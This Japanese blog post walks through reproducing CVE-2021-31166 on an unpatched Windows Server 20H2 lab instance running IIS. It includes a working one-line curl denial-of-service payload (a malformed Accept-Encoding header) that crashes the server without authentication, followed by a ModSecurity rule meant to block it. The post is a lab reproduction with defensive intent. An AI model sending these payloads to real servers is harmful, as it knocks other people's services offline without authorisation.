<div style="text-align:center;">[f:id:motikan2010:20210521180447p:plain]</div>

<div class="contents-box"><p>[:contents]</p></div>

## はじめに

　今回は特定の Windows 環境で動作する CVE-2021-31166 (HTTP Protocol Stack Remote Code Execution) を検証していきます。  
（PoCを動かすだけのク○記事を量産することに引け目を感じますが・・・(´・ω・)。）

CVE-2021-31166 の影響を受けるソフトウェアなどの詳細情報はこちらにあります。  
[https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166:embed:cite]

　脆弱性の詳細などはこちらにあります。
[https://www.mcafee.com/blogs/other-blogs/mcafee-labs/major-http-vulnerability-in-windows-could-lead-to-wormable-exploit/:embed:cite]

> unauthenticated denial-of-service (Blue Screen of Death) 

ということで、<span class="m-y">認証なしにターゲットとなるサーバをブルースクリーンにすることができてしまう脆弱性</span>です。


## 環境構築

　AWS EC2 上で「Windows Server, version 20H2 (Server Core Installation)」を動かし検証を進めていきます。

### EC2 の起動

　2021年5月のセキュリティパッチが適用されてない AMI である「<span class="m-y">Windows_Server-20H2-English-Core-Base-2021.04.14 (ami-02b7a976673d1d133)</span>」を選択して起動します。

[f:id:motikan2010:20210520000826p:plain:w600]

　（最初、誤ってセキュリティパッチ適用済みである「Microsoft Windows Server 20H2 Core Base (ami-0e2c9cfe1973e9a42)」を導入してしまい脆弱性の再現ができないといったことがありました。）

　インスタンスが起動したらパスワードを取得し、RDSで Windows Server に接続します。  
[https://aws.amazon.com/jp/premiumsupport/knowledge-center/retrieve-windows-admin-password/:embed:cite]

　パスワード取得はインスタンス起動後直後にはできなく、4分ほど待つ必要がありました。  
[f:id:motikan2010:20210520000751p:plain:w500]


### IIS(Internet Information Services) の導入

　まずは Windows PowerShell を起動し IIS が導入されているのかを確認します。
<div class="md-code" style="width:100%">
```
C:\Users\Administrator>powershell

PS C:\Users\Administrator>Get-WindowsFeature -Name Web-*
```
</div>

[f:id:motikan2010:20210520000755p:plain:w600]

　各項目で `[ ]` となっているので入っていなさそうです。


　以下のコマンドで IIS を導入します。  
<div class="md-code" style="width:100%">
```
PS C:\Users\Administrator>Install-WindowsFeature Web-Server -IncludeAllSubFeature
```
</div>

　IIS が導入されたかを再度確認します。  
[f:id:motikan2010:20210520000803p:plain:w600]

　念のため本脆弱性のパッチが適用されていないこと確認をします。以下のコマンドで確認できます。  
<div class="md-code" style="width:100%">
```
PS C:\Users\Administrator>wmic qfe list
```
</div>

[f:id:motikan2010:20210520000818p:plain:w600]

　2021年4月までのパッチしか適用されていないことが確認できました。  

### ブラウザでアクセス

　ブラウザで IIS にアクセスします。以下のような画面が表示されていたら導入は完了です。  
[f:id:motikan2010:20210520000811p:plain:w600]


## 脆弱性を試す

### PoC を動かす & サーバが落ちたことの確認

　本脆弱性の PoC は既に GitHub 上で公開されています。
[https://github.com/0vercl0k/CVE-2021-31166:embed:cite]

　上記リポジトリでは Python で実装されていますが、curl コマンドでも問題なので curl コマンドで検証行っていきます。  

PoC 通りに `Accept-Encoding`ヘッダーの値に「`doar-e, ftw, imo, ,`」を指定して送信します。  
<div class="md-code" style="width:100%">
```
$ curl 'http://target.example.com/' -H 'Accept-Encoding: doar-e, ftw, imo, ,'
curl: (52) Empty reply from server

```
</div>

　先ほどアクセスした IIS の画面を更新してみます。下の画像では分かりづらいですが、レスポンスが返ってこない状態となります。  
RDS の接続も切断されることも確認できます。  
[f:id:motikan2010:20210520000821p:plain:w600]

　curl でアクセスしてみても同様にレスポンスが返却されないことが確認できます。  
<div class="md-code" style="width:100%">
```
$ curl 'http://target.example.com/' -m 10
curl: (28) Operation timed out after 10002 milliseconds with 0 bytes received
```
</div>

　EC2 のモニタリング画面でもサーバが落ちたことを確認できます。  
[f:id:motikan2010:20210520001222p:plain:w500]

　そして、`Accept-Encoding`ヘッダー値は「`doar-e, ftw, imo, ,`」以外でも問題なく「`1,,`」という値でも再現します。

脆弱性の技術的な内容は PoC のリポジトリを参照ください。なんとなく分かるはずです。（私は1㍉もわかりませんでした）

<div class="md-code" style="width:100%">
```
$ curl 'http://target.example.com/' -H 'Accept-Encoding: 1,,'
curl: (52) Empty reply from server
```
</div>

### 【おまけ】 WAF (ModSecurity) でブロックしてみる

　PoC を動かすだけでは内容が寂しいので WAF (ModSecurity) のルールを書いてみました。  

<span style="color: #ff0000">`Accept-Encoding`ヘッダの仕様に詳しくない私が書いているので、あくまで参考程度に...。</span>

<div class="md-code" style="width:100%">
```
SecRule REQUEST_HEADERS:Accept-Encoding "@rx .*,\s*," \
    "id:2,\
    t:none,log,deny,\
    msg:'CVE-2021-31166'"
```
</div>

　以下のようにブロックできてる。（っぽい）
<div class="md-code" style="width:100%">
```
$ curl 'http://target.example.com' -H 'Accept-Encoding: doar-e, ftw, imo, ,'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.15.12</center>
</body>
</html>

$ curl 'http://target.example.com/' -H 'Accept-Encoding: 1,,'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.15.12</center>
</body>
</html>
```
</div>

## まとめ

Windows Server にさわる機会はすくないので助かる。  
PowerShell is ナニ。  
そしてインスタンスの停止忘れで死んだ。

## 更新履歴

- 2021年5月19日 新規作成
- 2021年5月21日 サムネイル修正